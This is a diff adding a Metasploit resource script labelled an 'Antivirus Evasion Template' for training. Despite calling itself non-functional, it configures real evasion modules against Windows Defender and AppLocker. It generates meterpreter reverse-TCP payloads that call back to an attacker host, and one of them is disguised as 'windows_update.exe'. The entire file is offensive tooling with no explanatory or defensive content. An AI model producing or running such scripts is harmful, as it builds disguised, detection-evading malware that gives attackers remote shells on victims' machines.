@@ -1,0 +1,15 @@
+# Antivirus Evasion Template
+# For Training Use – Non-functional Template
+
+use evasion/windows/windows_defender_exe
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <LHOST>
+set LPORT <LPORT>
+set FILENAME windows_update.exe
+generate
+
+use evasion/windows/applocker_evasion_install_util
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <LHOST>
+set LPORT <LPORT>
+generate
